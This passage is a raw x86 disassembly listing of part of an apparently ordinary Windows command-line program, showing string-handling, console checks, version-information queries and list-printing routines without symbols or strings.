  40bfd6:	jne    0x40bff1
  40bfd8:	push   DWORD PTR ds:0x421f04
  40bfde:	push   0xfa8
  40bfe3:	push   DWORD PTR ds:0x4216d4
  40bfe9:	call   0x405021
  40bfee:	add    esp,0xc
  40bff1:	pop    edi
  40bff2:	push   0x422
  40bff7:	push   0x0
  40bff9:	call   0x405021
  40bffe:	pop    ecx
  40bfff:	pop    ecx
  40c000:	pop    esi
  40c001:	jmp    0x40c006
  40c006:	push   esi
  40c007:	call   DWORD PTR ds:0x4374b4
  40c00d:	mov    esi,DWORD PTR ds:0x432428
  40c013:	jmp    0x40c03e
  40c015:	push   DWORD PTR [esi+0x4]
  40c018:	call   DWORD PTR ds:0x4374b0
  40c01e:	test   BYTE PTR ds:0x4114be,0x4
  40c025:	pop    ecx
  40c026:	je     0x40c03c
  40c028:	push   DWORD PTR [esi+0x4]
  40c02b:	push   0x4024bc
  40c030:	call   0x40c2d0
  40c035:	pop    ecx
  40c036:	pop    ecx
  40c037:	call   0x40c2b2
  40c03c:	mov    esi,DWORD PTR [esi]
  40c03e:	test   esi,esi
  40c040:	jne    0x40c015
  40c042:	pop    esi
  40c043:	ret    
  40c044:	push   ebx
  40c045:	mov    edx,ecx
  40c047:	push   esi
  40c048:	lea    esi,[edx+0x2]
  40c04b:	xor    ebx,ebx
  40c04d:	mov    ax,WORD PTR [edx]
  40c050:	add    edx,0x2
  40c053:	cmp    ax,bx
  40c056:	jne    0x40c04d
  40c058:	sub    edx,esi
  40c05a:	push   0x22
  40c05c:	sar    edx,1
  40c05e:	lea    eax,[ecx-0x2]
  40c061:	pop    esi
  40c062:	lea    eax,[eax+edx*2]
  40c065:	cmp    WORD PTR [ecx],si
  40c068:	jne    0x40c083
  40c06a:	cmp    WORD PTR [eax],si
  40c06d:	jne    0x40c083
  40c06f:	mov    bl,0x1
  40c071:	jmp    0x40c080
  40c073:	movzx  edx,WORD PTR [eax]
  40c076:	cmp    edx,0x20
  40c079:	je     0x40c080
  40c07b:	cmp    edx,0x2e
  40c07e:	jne    0x40c087
  40c080:	sub    eax,0x2
  40c083:	cmp    eax,ecx
  40c085:	ja     0x40c073
  40c087:	test   bl,bl
  40c089:	je     0x40c091
  40c08b:	add    eax,0x2
  40c08e:	mov    WORD PTR [eax],si
  40c091:	xor    ecx,ecx
  40c093:	pop    esi
  40c094:	mov    WORD PTR [eax+0x2],cx
  40c098:	pop    ebx
  40c099:	ret    
  40c09a:	push   ebp
  40c09b:	mov    ebp,esp
  40c09d:	sub    esp,0x61c
  40c0a3:	mov    eax,ds:0x411018
  40c0a8:	xor    eax,ebp
  40c0aa:	mov    DWORD PTR [ebp-0x4],eax
  40c0ad:	push   ebx
  40c0ae:	push   esi
  40c0af:	xor    esi,esi
  40c0b1:	cmp    BYTE PTR ds:0x4362ec,0x0
  40c0b8:	push   edi
  40c0b9:	mov    ebx,ecx
  40c0bb:	jne    0x40c157
  40c0c1:	push   esi
  40c0c2:	push   esi
  40c0c3:	mov    edi,0x100
  40c0c8:	push   edi
  40c0c9:	lea    eax,[ebp-0x210]
  40c0cf:	push   eax
  40c0d0:	push   edi
  40c0d1:	lea    eax,[ebp-0x410]
  40c0d7:	push   eax
  40c0d8:	push   0x3
  40c0da:	lea    eax,[ebp-0xc]
  40c0dd:	push   eax
  40c0de:	mov    eax,ds:0x437448
  40c0e3:	push   DWORD PTR [eax]
  40c0e5:	call   DWORD PTR ds:0x437438
  40c0eb:	push   esi
  40c0ec:	push   esi
  40c0ed:	lea    eax,[ebp-0x410]
  40c0f3:	push   eax
  40c0f4:	lea    eax,[ebp-0xc]
  40c0f7:	push   eax
  40c0f8:	lea    eax,[ebp-0x618]
  40c0fe:	push   0x104
  40c103:	push   eax
  40c104:	call   DWORD PTR ds:0x43743c
  40c10a:	push   0xffffffff
  40c10c:	push   0x4024d0
  40c111:	lea    eax,[ebp-0x210]
  40c117:	push   edi
  40c118:	push   eax
  40c119:	call   DWORD PTR ds:0x43747c
  40c11f:	add    esp,0x4c
  40c122:	test   eax,eax
  40c124:	je     0x40c130
  40c126:	mov    edi,esi
  40c128:	mov    DWORD PTR ds:0x4362f0,edi
  40c12e:	jmp    0x40c14e
  40c130:	sub    esp,0x18
  40c133:	lea    edx,[ebp-0x210]
  40c139:	lea    ecx,[ebp-0x618]
  40c13f:	call   0x40a374
  40c144:	test   eax,eax
  40c146:	js     0x40c126
  40c148:	mov    edi,DWORD PTR ds:0x4362f0
  40c14e:	mov    BYTE PTR ds:0x4362ec,0x1
  40c155:	jmp    0x40c15d
  40c157:	mov    edi,DWORD PTR ds:0x4362f0
  40c15d:	movzx  eax,WORD PTR ds:0x4362f4
  40c164:	push   eax
  40c165:	mov    eax,ebx
  40c167:	shr    eax,0x4
  40c16a:	inc    eax
  40c16b:	movzx  eax,ax
  40c16e:	push   eax
  40c16f:	push   0x6
  40c171:	push   edi
  40c172:	call   DWORD PTR ds:0x4372e8
  40c178:	test   eax,eax
  40c17a:	je     0x40c1a7
  40c17c:	push   eax
  40c17d:	push   edi
  40c17e:	call   DWORD PTR ds:0x4372ec
  40c184:	mov    edx,eax
  40c186:	test   edx,edx
  40c188:	je     0x40c1a7
  40c18a:	and    ebx,0xf
  40c18d:	je     0x40c19b
  40c18f:	movzx  eax,WORD PTR [edx]
  40c192:	lea    edx,[edx+eax*2]
  40c195:	add    edx,0x2
  40c198:	dec    ebx
  40c199:	jne    0x40c18f
  40c19b:	movzx  esi,WORD PTR [edx]
  40c19e:	neg    esi
  40c1a0:	lea    ecx,[edx+0x2]
  40c1a3:	sbb    esi,esi
  40c1a5:	and    esi,ecx
  40c1a7:	mov    ecx,DWORD PTR [ebp-0x4]
  40c1aa:	pop    edi
  40c1ab:	mov    eax,esi
  40c1ad:	pop    esi
  40c1ae:	xor    ecx,ebp
  40c1b0:	pop    ebx
  40c1b1:	call   0x40fd0b
  40c1b6:	leave  
  40c1b7:	ret    
  40c1b8:	push   ebp
  40c1b9:	mov    ebp,esp
  40c1bb:	push   ecx
  40c1bc:	push   esi
  40c1bd:	push   ecx
  40c1be:	call   DWORD PTR ds:0x437428
  40c1c4:	push   eax
  40c1c5:	call   DWORD PTR ds:0x4374b8
  40c1cb:	pop    ecx
  40c1cc:	pop    ecx
  40c1cd:	mov    esi,eax
  40c1cf:	push   esi
  40c1d0:	call   DWORD PTR ds:0x437394
  40c1d6:	and    eax,0xffff7fff
  40c1db:	cmp    eax,0x2
  40c1de:	je     0x40c1e4
  40c1e0:	xor    al,al
  40c1e2:	jmp    0x40c1f4
  40c1e4:	lea    eax,[ebp-0x4]
  40c1e7:	push   eax
  40c1e8:	push   esi
  40c1e9:	call   DWORD PTR ds:0x437398
  40c1ef:	test   eax,eax
  40c1f1:	setne  al
  40c1f4:	pop    esi
  40c1f5:	leave  
  40c1f6:	ret    
  40c1f7:	cmp    BYTE PTR ds:0x432637,0x0
  40c1fe:	je     0x40c203
  40c200:	xor    eax,eax
  40c202:	ret    
  40c203:	call   DWORD PTR ds:0x43741c
  40c209:	add    eax,0x40
  40c20c:	push   eax
  40c20d:	call   DWORD PTR ds:0x4374bc
  40c213:	pop    ecx
  40c214:	ret    
  40c215:	push   ebp
  40c216:	mov    ebp,esp
  40c218:	lea    edx,[ebp+0xc]
  40c21b:	mov    ecx,DWORD PTR [ebp+0x8]
  40c21e:	pop    ebp
  40c21f:	jmp    0x40c28a
  40c224:	cmp    BYTE PTR ds:0x432637,0x0
  40c22b:	je     0x40c237
  40c22d:	push   0xa
  40c22f:	call   DWORD PTR ds:0x4374c0
  40c235:	jmp    0x40c24a
  40c237:	call   DWORD PTR ds:0x43741c
  40c23d:	add    eax,0x40
  40c240:	push   eax
  40c241:	push   0xa
  40c243:	call   DWORD PTR ds:0x4374c4
  40c249:	pop    ecx
  40c24a:	movzx  eax,ax
  40c24d:	pop    ecx
  40c24e:	ret    
  40c24f:	push   edi
  40c250:	mov    edi,ecx
  40c252:	call   DWORD PTR ds:0x43741c
  40c258:	add    eax,0x40
  40c25b:	push   eax
  40c25c:	call   DWORD PTR ds:0x437428
  40c262:	pop    ecx
  40c263:	push   eax
  40c264:	push   edi
  40c265:	call   DWORD PTR ds:0x437428
  40c26b:	pop    ecx
  40c26c:	push   eax
  40c26d:	call   DWORD PTR ds:0x437424
  40c273:	pop    ecx
  40c274:	pop    ecx
  40c275:	call   DWORD PTR ds:0x43741c
  40c27b:	lea    ecx,[eax+0x40]
  40c27e:	call   0x40c1b8
  40c283:	mov    ds:0x432637,al
  40c288:	pop    edi
  40c289:	ret    
  40c28a:	cmp    BYTE PTR ds:0x432637,0x0
  40c291:	push   edx
  40c292:	push   ecx
  40c293:	je     0x40c29e
  40c295:	call   DWORD PTR ds:0x4374c8
  40c29b:	pop    ecx
  40c29c:	pop    ecx
  40c29d:	ret    
  40c29e:	call   DWORD PTR ds:0x43741c
  40c2a4:	add    eax,0x40
  40c2a7:	push   eax
  40c2a8:	call   DWORD PTR ds:0x4374cc
  40c2ae:	add    esp,0xc
  40c2b1:	ret    
  40c2b2:	cmp    BYTE PTR ds:0x432644,0x0
  40c2b9:	je     0x40c2be
  40c2bb:	xor    eax,eax
  40c2bd:	ret    
  40c2be:	call   DWORD PTR ds:0x43741c
  40c2c4:	add    eax,0x20
  40c2c7:	push   eax
  40c2c8:	call   DWORD PTR ds:0x4374bc
  40c2ce:	pop    ecx
  40c2cf:	ret    
  40c2d0:	push   ebp
  40c2d1:	mov    ebp,esp
  40c2d3:	lea    edx,[ebp+0xc]
  40c2d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40c2d9:	pop    ebp
  40c2da:	jmp    0x40c30a
  40c2df:	cmp    BYTE PTR ds:0x432644,0x0
  40c2e6:	je     0x40c2f2
  40c2e8:	push   0xa
  40c2ea:	call   DWORD PTR ds:0x4374c0
  40c2f0:	jmp    0x40c305
  40c2f2:	call   DWORD PTR ds:0x43741c
  40c2f8:	add    eax,0x20
  40c2fb:	push   eax
  40c2fc:	push   0xa
  40c2fe:	call   DWORD PTR ds:0x4374c4
  40c304:	pop    ecx
  40c305:	movzx  eax,ax
  40c308:	pop    ecx
  40c309:	ret    
  40c30a:	cmp    BYTE PTR ds:0x432644,0x0
  40c311:	push   edx
  40c312:	push   ecx
  40c313:	je     0x40c31e
  40c315:	call   DWORD PTR ds:0x4374c8
  40c31b:	pop    ecx
  40c31c:	pop    ecx
  40c31d:	ret    
  40c31e:	call   DWORD PTR ds:0x43741c
  40c324:	add    eax,0x20
  40c327:	push   eax
  40c328:	call   DWORD PTR ds:0x4374cc
  40c32e:	add    esp,0xc
  40c331:	ret    
  40c332:	push   ebp
  40c333:	mov    ebp,esp
  40c335:	push   ecx
  40c336:	push   ecx
  40c337:	mov    eax,ds:0x411028
  40c33c:	add    eax,0x2
  40c33f:	mov    BYTE PTR [eax+0x43233f],0x17
  40c346:	mov    BYTE PTR ds:0x421f12,0x1
  40c34d:	mov    ds:0x411028,eax
  40c352:	cmp    eax,0x10
  40c355:	jae    0x40c50d
  40c35b:	mov    BYTE PTR [eax+0x432340],0x0
  40c362:	mov    eax,ds:0x4216d4
  40c367:	push   ebx
  40c368:	xor    dl,dl
  40c36a:	mov    ds:0x4216e0,eax
  40c36f:	call   0x4092d5
  40c374:	mov    edx,DWORD PTR ds:0x411028
  40c37a:	mov    ch,al
  40c37c:	mov    cl,BYTE PTR [edx+0x432340]
  40c382:	mov    bl,cl
  40c384:	xor    bh,bh
  40c386:	mov    BYTE PTR [ebp-0x1],ch
  40c389:	cmp    bl,0x17
  40c38c:	je     0x40c503
  40c392:	push   esi
  40c393:	push   edi
  40c394:	push   0xf
  40c396:	pop    edi
  40c397:	test   bl,0x40
  40c39a:	je     0x40c3bc
  40c39c:	movzx  eax,cl
  40c39f:	and    eax,edi
  40c3a1:	dec    edx
  40c3a2:	mov    eax,DWORD PTR [eax*4+0x401490]
  40c3a9:	mov    DWORD PTR ds:0x411028,edx
  40c3af:	call   eax
  40c3b1:	mov    edx,DWORD PTR ds:0x411028
  40c3b7:	jmp    0x40c4ed
  40c3bc:	test   bl,0x10
  40c3bf:	je     0x40c45e
  40c3c5:	cmp    bl,ch
  40c3c7:	je     0x40c3e3
  40c3c9:	push   0x4216f0
  40c3ce:	push   0x409
  40c3d3:	push   DWORD PTR ds:0x4216e0
  40c3d9:	call   0x405021
  40c3de:	add    esp,0xc
  40c3e1:	jmp    0x40c3b1
  40c3e3:	mov    al,BYTE PTR [edx+0x43233f]
  40c3e9:	dec    edx
  40c3ea:	mov    DWORD PTR ds:0x411028,edx
  40c3f0:	test   al,0x40
  40c3f2:	je     0x40c40f
  40c3f4:	movzx  eax,al
  40c3f7:	and    eax,edi
  40c3f9:	dec    edx
  40c3fa:	mov    eax,DWORD PTR [eax*4+0x401490]
  40c401:	mov    DWORD PTR ds:0x411028,edx
  40c407:	call   eax
  40c409:	mov    edx,DWORD PTR ds:0x411028
  40c40f:	mov    eax,ds:0x4216d4
  40c414:	mov    ds:0x4216e0,eax
  40c419:	test   bh,bh
  40c41b:	je     0x40c439
  40c41d:	cmp    WORD PTR ds:0x4216f0,0xa
  40c425:	jne    0x40c42d
  40c427:	dec    eax
  40c428:	mov    ds:0x4216e0,eax
  40c42d:	mov    ch,bh
  40c42f:	mov    BYTE PTR [ebp-0x1],ch
  40c432:	xor    bh,bh
  40c434:	jmp    0x40c4f0
  40c439:	mov    dl,BYTE PTR [edx+0x432340]
  40c43f:	call   0x4092d5
  40c444:	mov    edx,DWORD PTR ds:0x411028
  40c44a:	mov    ch,al
  40c44c:	mov    eax,ds:0x4216d4
  40c451:	mov    BYTE PTR [ebp-0x1],ch
  40c454:	mov    ds:0x4216e0,eax
  40c459:	jmp    0x40c4f0
  40c45e:	movzx  eax,ch
  40c461:	movzx  esi,bl
  40c464:	and    eax,edi
  40c466:	movzx  eax,BYTE PTR [eax+esi*8+0x4014c0]
  40c46e:	mov    DWORD PTR [ebp-0x8],eax
  40c471:	test   al,0x20
  40c473:	je     0x40c497
  40c475:	push   0x4216f0
  40c47a:	add    eax,0x3e8
  40c47f:	push   eax
  40c480:	push   DWORD PTR ds:0x4216e0
  40c486:	call   0x405021
  40c48b:	mov    edx,DWORD PTR ds:0x411028
  40c491:	mov    eax,DWORD PTR [ebp-0x8]
  40c494:	add    esp,0xc
  40c497:	dec    edx
  40c498:	mov    DWORD PTR ds:0x411028,edx
  40c49e:	test   al,al
  40c4a0:	jns    0x40c4cc
  40c4a2:	and    eax,edi
  40c4a4:	mov    DWORD PTR [ebp-0x8],eax
  40c4a7:	test   bh,bh
  40c4a9:	jne    0x40c4bd
  40c4ab:	mov    dl,bl
  40c4ad:	call   0x4092d5
  40c4b2:	mov    edx,DWORD PTR ds:0x411028
  40c4b8:	mov    bh,al
  40c4ba:	mov    eax,DWORD PTR [ebp-0x8]
  40c4bd:	movzx  ecx,bh
  40c4c0:	and    ecx,edi
  40c4c2:	movzx  ecx,BYTE PTR [ecx+esi*8+0x4014a8]
  40c4ca:	add    eax,ecx
  40c4cc:	mov    esi,DWORD PTR [eax*4+0x401500]
  40c4d3:	movzx  ecx,BYTE PTR [esi]
  40c4d6:	test   ecx,ecx
  40c4d8:	je     0x40c4ed
  40c4da:	mov    al,BYTE PTR [esi+ecx*1]
  40c4dd:	inc    edx
  40c4de:	mov    BYTE PTR [edx+0x432340],al
  40c4e4:	dec    ecx
  40c4e5:	jne    0x40c4da
  40c4e7:	mov    DWORD PTR ds:0x411028,edx
  40c4ed:	mov    ch,BYTE PTR [ebp-0x1]
  40c4f0:	mov    cl,BYTE PTR [edx+0x432340]
  40c4f6:	mov    bl,cl
  40c4f8:	cmp    bl,0x17
  40c4fb:	jne    0x40c397
  40c501:	pop    edi
  40c502:	pop    esi
  40c503:	dec    edx
  40c504:	mov    DWORD PTR ds:0x411028,edx
  40c50a:	pop    ebx
  40c50b:	leave  
  40c50c:	ret    
  40c50d:	call   0x40fe50
  40c512:	int3   
  40c513:	push   esi
  40c514:	push   edi
  40c515:	lea    esi,[edx+0x2]
  40c518:	xor    edi,edi
  40c51a:	mov    ax,WORD PTR [edx]
  40c51d:	add    edx,0x2
  40c520:	cmp    ax,di
  40c523:	jne    0x40c51a
  40c525:	sub    edx,esi
  40c527:	sar    edx,1
  40c529:	add    ecx,edx
  40c52b:	cmp    ecx,0x28
  40c52e:	jbe    0x40c53d
  40c530:	push   0x40254c
  40c535:	call   0x40c2d0
  40c53a:	pop    ecx
  40c53b:	mov    ecx,edi
  40c53d:	pop    edi
  40c53e:	mov    eax,ecx
  40c540:	pop    esi
  40c541:	ret    
  40c542:	push   ebp
  40c543:	mov    ebp,esp
  40c545:	sub    esp,0x5c
  40c548:	mov    eax,ds:0x411018
  40c54d:	xor    eax,ebp
  40c54f:	mov    DWORD PTR [ebp-0x4],eax
  40c552:	mov    eax,DWORD PTR [ebp+0x8]
  40c555:	or     eax,DWORD PTR [ebp+0xc]
  40c558:	push   ebx
  40c559:	push   esi
  40c55a:	push   edi
  40c55b:	mov    edi,edx
  40c55d:	mov    esi,ecx
  40c55f:	jne    0x40c574
  40c561:	push   edi
  40c562:	push   0x20
  40c564:	lea    eax,[esi+0x1a]
  40c567:	push   eax
  40c568:	push   0x6
  40c56a:	call   0x4050f7
  40c56f:	add    esp,0x10
  40c572:	jmp    0x40c5eb
  40c574:	lea    eax,[ebp-0x5c]
  40c577:	push   eax
  40c578:	lea    eax,[ebp+0x8]
  40c57b:	push   eax
  40c57c:	call   DWORD PTR ds:0x43739c
  40c582:	test   eax,eax
  40c584:	je     0x40c5eb
  40c586:	lea    eax,[ebp-0x54]
  40c589:	push   eax
  40c58a:	lea    eax,[ebp-0x5c]
  40c58d:	push   eax
  40c58e:	call   DWORD PTR ds:0x4373a0
  40c594:	test   eax,eax
  40c596:	je     0x40c5eb
  40c598:	push   0x14
  40c59a:	lea    eax,[ebp-0x44]
  40c59d:	push   eax
  40c59e:	push   0x402558
  40c5a3:	lea    eax,[ebp-0x54]
  40c5a6:	push   eax
  40c5a7:	push   0x0
  40c5a9:	mov    ebx,0x400
  40c5ae:	push   ebx
  40c5af:	call   DWORD PTR ds:0x4373a4
  40c5b5:	test   eax,eax
  40c5b7:	je     0x40c5eb
  40c5b9:	push   0xc
  40c5bb:	lea    eax,[ebp-0x1c]
  40c5be:	push   eax
  40c5bf:	push   0x40257c
  40c5c4:	lea    eax,[ebp-0x54]
  40c5c7:	push   eax
  40c5c8:	push   0x0
  40c5ca:	push   ebx
  40c5cb:	call   DWORD PTR ds:0x4373a8
  40c5d1:	test   eax,eax
  40c5d3:	je     0x40c5eb
  40c5d5:	push   edi
  40c5d6:	push   0x20
  40c5d8:	push   esi
  40c5d9:	lea    eax,[ebp-0x1c]
  40c5dc:	push   eax
  40c5dd:	lea    eax,[ebp-0x44]
  40c5e0:	push   eax
  40c5e1:	push   0x4
  40c5e3:	call   0x4050f7
  40c5e8:	add    esp,0x18
  40c5eb:	mov    ecx,DWORD PTR [ebp-0x4]
  40c5ee:	pop    edi
  40c5ef:	pop    esi
  40c5f0:	xor    ecx,ebp
  40c5f2:	pop    ebx
  40c5f3:	call   0x40fd0b
  40c5f8:	leave  
  40c5f9:	ret    0x8
  40c5fc:	push   ebp
  40c5fd:	mov    ebp,esp
  40c5ff:	sub    esp,0x274
  40c605:	mov    eax,ds:0x411018
  40c60a:	xor    eax,ebp
  40c60c:	mov    DWORD PTR [ebp-0x4],eax
  40c60f:	push   ebx
  40c610:	push   esi
  40c611:	push   edi
  40c612:	push   0xc
  40c614:	mov    edi,ecx
  40c616:	mov    DWORD PTR [ebp-0x264],ecx
  40c61c:	mov    DWORD PTR [ebp-0x270],edx
  40c622:	call   0x4050f7
  40c627:	xor    ebx,ebx
  40c629:	pop    ecx
  40c62a:	mov    DWORD PTR [ebp-0x25c],ebx
  40c630:	jmp    0x40c7ee
  40c635:	push   0x24
  40c637:	push   DWORD PTR [edi+0x4]
  40c63a:	call   DWORD PTR ds:0x437540
  40c640:	pop    ecx
  40c641:	pop    ecx
  40c642:	test   eax,eax
  40c644:	je     0x40c755
  40c64a:	mov    ecx,DWORD PTR [edi+0x4]
  40c64d:	and    DWORD PTR [ebp-0x268],0x0
  40c654:	lea    eax,[ebp-0x270]
  40c65a:	push   eax
  40c65b:	mov    dl,0x1
  40c65d:	call   0x40e68f
  40c662:	lea    ecx,[ebp-0x268]
  40c668:	push   ecx
  40c669:	push   0x401090
  40c66e:	push   eax
  40c66f:	mov    DWORD PTR [ebp-0x26c],eax
  40c675:	call   DWORD PTR ds:0x4373c8
  40c67b:	mov    ebx,eax
  40c67d:	add    esp,0xc
  40c680:	test   ebx,ebx
  40c682:	je     0x40c73d
  40c688:	mov    edi,DWORD PTR [ebp-0x25c]
  40c68e:	push   0x401088
  40c693:	push   ebx
  40c694:	call   DWORD PTR ds:0x437544
  40c69a:	pop    ecx
  40c69b:	pop    ecx
  40c69c:	test   eax,eax
  40c69e:	je     0x40c6f8
  40c6a0:	lea    eax,[ebp-0x260]
  40c6a6:	push   eax
  40c6a7:	lea    edx,[ebp-0x258]
  40c6ad:	mov    ecx,ebx
  40c6af:	call   0x40726d
  40c6b4:	jmp    0x40c6f2
  40c6b6:	mov    edx,eax
  40c6b8:	mov    ecx,ebx
  40c6ba:	call   0x40f26d
  40c6bf:	mov    esi,eax
  40c6c1:	push   esi
  40c6c2:	push   0x402590
  40c6c7:	call   0x40c2d0
  40c6cc:	pop    ecx
  40c6cd:	pop    ecx
  40c6ce:	mov    edx,esi
  40c6d0:	mov    ecx,edi
  40c6d2:	call   0x40c513
  40c6d7:	push   esi
  40c6d8:	mov    edi,eax
  40c6da:	call   DWORD PTR ds:0x43754c
  40c6e0:	mov    edx,DWORD PTR [ebp-0x260]
  40c6e6:	pop    ecx
  40c6e7:	lea    ecx,[ebp-0x258]
  40c6ed:	call   0x4073f5
  40c6f2:	test   eax,eax
  40c6f4:	jne    0x40c6b6
  40c6f6:	jmp    0x40c710
  40c6f8:	push   ebx
  40c6f9:	push   0x402590
  40c6fe:	call   0x40c2d0
  40c703:	pop    ecx
  40c704:	pop    ecx
  40c705:	mov    edx,ebx
  40c707:	mov    ecx,edi
  40c709:	call   0x40c513
  40c70e:	mov    edi,eax
  40c710:	lea    eax,[ebp-0x268]
  40c716:	push   eax
  40c717:	push   0x401090
  40c71c:	push   0x0
  40c71e:	call   DWORD PTR ds:0x4373c8
  40c724:	mov    ebx,eax
  40c726:	add    esp,0xc
  40c729:	test   ebx,ebx
  40c72b:	jne    0x40c68e
  40c731:	mov    DWORD PTR [ebp-0x25c],edi
  40c737:	mov    edi,DWORD PTR [ebp-0x264]
  40c73d:	push   DWORD PTR [ebp-0x26c]
  40c743:	call   DWORD PTR ds:0x43754c
  40c749:	mov    ebx,DWORD PTR [ebp-0x25c]
  40c74f:	pop    ecx
  40c750:	jmp    0x40c7e6
  40c755:	push   0x401088
  40c75a:	push   DWORD PTR [edi+0x4]
  40c75d:	call   DWORD PTR ds:0x437544
  40c763:	pop    ecx
  40c764:	pop    ecx
  40c765:	test   eax,eax
  40c767:	je     0x40c7c5
  40c769:	mov    ecx,DWORD PTR [edi+0x4]
  40c76c:	lea    eax,[ebp-0x260]
  40c772:	push   eax
  40c773:	lea    edx,[ebp-0x258]
  40c779:	call   0x40726d
  40c77e:	test   eax,eax
  40c780:	je     0x40c7e6
  40c782:	mov    ecx,DWORD PTR [edi+0x4]
  40c785:	mov    edx,eax
  40c787:	call   0x40f26d
  40c78c:	mov    esi,eax
  40c78e:	push   esi
  40c78f:	push   0x402590
  40c794:	call   0x40c2d0
  40c799:	pop    ecx
  40c79a:	pop    ecx
  40c79b:	mov    edx,esi
  40c79d:	mov    ecx,ebx
  40c79f:	call   0x40c513
  40c7a4:	push   esi
  40c7a5:	mov    ebx,eax
  40c7a7:	call   DWORD PTR ds:0x43754c
  40c7ad:	mov    edx,DWORD PTR [ebp-0x260]
  40c7b3:	pop    ecx
  40c7b4:	lea    ecx,[ebp-0x258]
  40c7ba:	call   0x4073f5
  40c7bf:	test   eax,eax
  40c7c1:	jne    0x40c782
  40c7c3:	jmp    0x40c7e0
  40c7c5:	push   DWORD PTR [edi+0x4]
  40c7c8:	push   0x402590
  40c7cd:	call   0x40c2d0
  40c7d2:	mov    edx,DWORD PTR [edi+0x4]
  40c7d5:	pop    ecx
  40c7d6:	pop    ecx
  40c7d7:	mov    ecx,ebx
  40c7d9:	call   0x40c513
  40c7de:	mov    ebx,eax
  40c7e0:	mov    DWORD PTR [ebp-0x25c],ebx
  40c7e6:	mov    edi,DWORD PTR [edi]
  40c7e8:	mov    DWORD PTR [ebp-0x264],edi
  40c7ee:	test   edi,edi
  40c7f0:	jne    0x40c635
  40c7f6:	mov    ecx,DWORD PTR [ebp-0x4]
  40c7f9:	pop    edi
  40c7fa:	pop    esi
  40c7fb:	xor    ecx,ebp
  40c7fd:	pop    ebx
  40c7fe:	call   0x40fd0b
  40c803:	leave  
  40c804:	ret    
  40c805:	push   ebx
  40c806:	push   esi
  40c807:	push   edi
  40c808:	push   0x8
  40c80a:	call   0x4050f7
  40c80f:	pop    ecx
  40c810:	mov    edi,0x431f40
  40c815:	mov    esi,DWORD PTR [edi]
  40c817:	jmp    0x40c85a
  40c819:	mov    eax,DWORD PTR [esi+0x8]
  40c81c:	test   eax,eax
  40c81e:	je     0x40c858
  40c820:	cmp    DWORD PTR [eax+0x4],0x0
  40c824:	je     0x40c858
  40c826:	push   DWORD PTR [eax+0x4]
  40c829:	push   DWORD PTR [esi+0x4]
  40c82c:	push   0xe
  40c82e:	call   0x4050f7
  40c833:	mov    eax,DWORD PTR [esi+0x8]
  40c836:	add    esp,0xc
  40c839:	mov    ebx,DWORD PTR [eax]
  40c83b:	jmp    0x40c854
  40c83d:	cmp    DWORD PTR [ebx+0x4],0x0
  40c841:	je     0x40c852
  40c843:	push   DWORD PTR [ebx+0x4]
  40c846:	push   0x402598
  40c84b:	call   0x40c2d0
  40c850:	pop    ecx
  40c851:	pop    ecx
  40c852:	mov    ebx,DWORD PTR [ebx]
  40c854:	test   ebx,ebx
  40c856:	jne    0x40c83d
  40c858:	mov    esi,DWORD PTR [esi]
  40c85a:	test   esi,esi
  40c85c:	jne    0x40c819
  40c85e:	add    edi,0x4
  40c861:	cmp    edi,0x432340
  40c867:	jl     0x40c815
  40c869:	call   0x40c2df
  40c86e:	pop    edi
  40c86f:	pop    esi
  40c870:	pop    ebx
  40c871:	jmp    0x40c2b2
  40c876:	push   esi
  40c877:	push   0x7
  40c879:	call   0x4050f7
  40c87e:	mov    esi,DWORD PTR ds:0x4216c4
  40c884:	pop    ecx
  40c885:	test   esi,esi
  40c887:	je     0x40c8df
  40c889:	push   edi
  40c88a:	cmp    BYTE PTR [esi+0x14],0x0
  40c88e:	mov    eax,0x4025a4
  40c893:	jne    0x40c89a
  40c895:	mov    eax,0x4025b0
  40c89a:	push   DWORD PTR [esi+0x8]
  40c89d:	push   eax
  40c89e:	call   0x40c2d0
  40c8a3:	push   0xa
  40c8a5:	call   0x4050f7
  40c8aa:	mov    edi,DWORD PTR [esi+0xc]
  40c8ad:	add    esp,0xc
  40c8b0:	test   edi,edi
  40c8b2:	je     0x40c8d3
  40c8b4:	push   DWORD PTR [edi+0x4]
  40c8b7:	push   0x4025b8
  40c8bc:	jmp    0x40c8c6
  40c8be:	push   DWORD PTR [edi+0x4]
  40c8c1:	push   0x4025c0
  40c8c6:	call   0x40c2d0
  40c8cb:	mov    edi,DWORD PTR [edi]
  40c8cd:	pop    ecx
  40c8ce:	pop    ecx
  40c8cf:	test   edi,edi
  40c8d1:	jne    0x40c8be
  40c8d3:	call   0x40c2df
  40c8d8:	mov    esi,DWORD PTR [esi]
  40c8da:	test   esi,esi
  40c8dc:	jne    0x40c88a
  40c8de:	pop    edi
  40c8df:	push   0x401180
  40c8e4:	push   0x4025d0
  40c8e9:	call   0x40c2d0
  40c8ee:	mov    esi,DWORD PTR ds:0x4216d0
  40c8f4:	jmp    0x40c905
  40c8f6:	push   DWORD PTR [esi+0x4]
  40c8f9:	push   0x402590
  40c8fe:	call   0x40c2d0
  40c903:	mov    esi,DWORD PTR [esi]
  40c905:	pop    ecx
  40c906:	pop    ecx
  40c907:	test   esi,esi
  40c909:	jne    0x40c8f6
  40c90b:	call   0x40c2df
  40c910:	pop    esi
  40c911:	jmp    0x40c2b2
  40c916:	push   ebp
  40c917:	mov    ebp,esp
  40c919:	and    esp,0xfffffff8
  40c91c:	sub    esp,0xc
  40c91f:	push   ebx
  40c920:	push   esi
  40c921:	push   edi
  40c922:	push   0x9
  40c924:	call   0x4050f7
  40c929:	xor    ebx,ebx
  40c92b:	pop    ecx
  40c92c:	mov    DWORD PTR [esp+0x14],ebx
  40c930:	mov    esi,DWORD PTR [ebx+0x4214c0]
  40c936:	mov    DWORD PTR [esp+0x10],esi
  40c93a:	test   esi,esi
  40c93c:	je     0x40ca36
  40c942:	mov    eax,DWORD PTR [esi+0x18]
  40c945:	mov    eax,DWORD PTR [eax+0x4]
  40c948:	mov    al,BYTE PTR [eax+0x10]
  40c94b:	and    al,0x20
  40c94d:	movzx  eax,al
  40c950:	neg    eax
  40c952:	sbb    eax,eax
  40c954:	and    eax,0x1a
  40c957:	add    eax,0x20
  40c95a:	push   eax
  40c95b:	push   DWORD PTR [esi+0x4]
  40c95e:	push   0x4025dc
  40c963:	call   0x40c2d0
  40c968:	mov    eax,DWORD PTR [esi+0x4]
  40c96b:	mov    ebx,DWORD PTR [esi+0x18]
  40c96e:	add    esp,0xc
  40c971:	mov    ds:0x421ef8,eax
  40c976:	mov    ds:0x421f04,eax
  40c97b:	mov    ds:0x421f08,eax
  40c980:	test   ebx,ebx
